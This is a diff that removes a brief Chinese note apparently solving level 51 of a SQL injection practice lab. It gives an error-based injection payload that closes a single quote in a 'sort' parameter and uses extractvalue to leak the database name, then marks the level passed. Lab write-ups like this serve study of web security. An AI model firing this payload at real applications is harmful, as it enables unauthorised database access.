@@ -1,9 +1,0 @@
-第51关
-
-单引号闭合
-
-报错注入
-?sort=1' and extractvalue(1,concat(0x7e,database(),0x7e)) --+
-
-
-闯关成功！！！
